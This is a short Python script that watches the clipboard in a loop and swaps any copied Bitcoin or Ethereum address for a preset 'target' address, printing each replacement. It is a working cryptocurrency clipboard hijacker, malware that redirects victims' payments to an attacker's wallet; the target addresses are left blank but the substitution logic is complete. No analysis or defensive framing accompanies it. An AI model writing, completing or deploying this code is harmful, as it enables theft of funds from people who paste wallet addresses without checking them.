import pyperclip

# Define the target addresses
btc_addresses = {
    "1": "",
    "bc1": "",
    "3": ""
}
eth_addresses = ["", "", ""]

# Function to replace copied address with the target address
def replace_address():
    current_address = pyperclip.paste()
    if current_address.startswith("1") or current_address.startswith("bc1") or current_address.startswith("3"):
        if current_address in btc_addresses.values():
            return
        else:
            for prefix, target_address in btc_addresses.items():
                if current_address.startswith(prefix):
                    pyperclip.copy(target_address)
                    print(f"BTC address replaced: {current_address} -> {target_address}")
                    return
    elif current_address.startswith("0x"):
        if current_address in eth_addresses:
            return
        else:
            pyperclip.copy(eth_addresses[0])
            print(f"ETH address replaced: {current_address} -> {eth_addresses[0]}")

# Call the replace_address() function whenever clipboard changes
while True:
    try:
        current_address = pyperclip.paste()
        if current_address.startswith("1") or current_address.startswith("bc1") or current_address.startswith("3") or current_address.startswith("0x"):
            replace_address()
    except KeyboardInterrupt:
        break


